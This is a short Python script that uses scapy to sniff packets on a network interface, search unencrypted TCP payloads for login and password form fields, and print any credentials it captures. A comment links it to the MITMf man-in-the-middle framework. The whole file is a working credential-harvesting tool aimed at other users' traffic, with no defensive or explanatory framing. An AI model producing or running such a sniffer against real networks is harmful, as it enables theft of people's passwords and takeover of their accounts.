from urllib import parse
import re
from scapy.all import *

#https://github.com/byt3bl33d3r/MITMf/wiki/Installation -> the same done


#my inthernet name
iface = "eth0"

def get_login_pass(body):
    user = None
    passwd = None

    #list of codewords to the username field
    userfields = ['log', 'login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', ] # ==== fill
    #list of codewords to the password field
    passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password'] # ==== fill

    for login in userfields:
        login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
        if login_re:
            user = login_re.group()
    for passfield in passfields:
        pass_re = re.search('(%s=[^&]+)' % passfield, body, re.IGNORECASE)
        if pass_re:
            passwd = pass_re.group()
    if user and passwd:
        return user, passwd

def pkt_parser(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
        body = str(packet[TCP].payload)
        user_pass = get_login_pass(body)
        if user_pass != None:
            print(packet[TCP].payload)
            print(parse.unquote(user_pass[0]))
            print(parse.unquote(user_pass[1]))
        else:
            pass

try:
    sniff(iface=iface, prn=pkt_parser, store=0)
except KeyboardInterrupt:
    print('Existing')
    exit(0)
